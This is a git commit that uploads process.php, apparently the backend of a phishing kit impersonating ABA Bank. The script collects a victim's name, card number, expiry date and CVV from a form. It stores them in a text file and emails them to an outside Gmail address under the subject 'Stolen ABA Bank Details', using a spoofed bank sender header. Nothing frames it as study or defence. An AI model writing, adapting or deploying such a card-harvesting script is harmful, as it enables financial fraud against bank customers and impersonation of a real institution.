b362b2c8ed121f595d72123d6e7e85d50d93f28c
ABA-Bank-services <menglihour008@gmail.com>
2024-06-08 23:58:23 +0700

    Add files via upload

---
+++ process.php
@@ -0,0 +1,19 @@
+<?php
+    $name = $_POST['name'];
+    $cardnumber = $_POST['cardnumber'];
+    $expiry = $_POST['expiry'];
+    $cvv = $_POST['cvv'];
+
+    $data = "$name | $cardnumber | $expiry | $cvv\n";
+
+    // Save to file
+    file_put_contents('bank_details.txt', $data, FILE_APPEND);
+
+    // Email the data
+    $to = "menglihour009@gmail.com";
+    $subject = "Stolen ABA Bank Details";
+    $message = "Name: $name\nCard Number: $cardnumber\nExpiry Date: $expiry\nCVV: $cvv";
+    $headers = "From: ABA Bank <security@ababank.com>";
+
+    mail($to, $subject, $message, $headers);
+?>
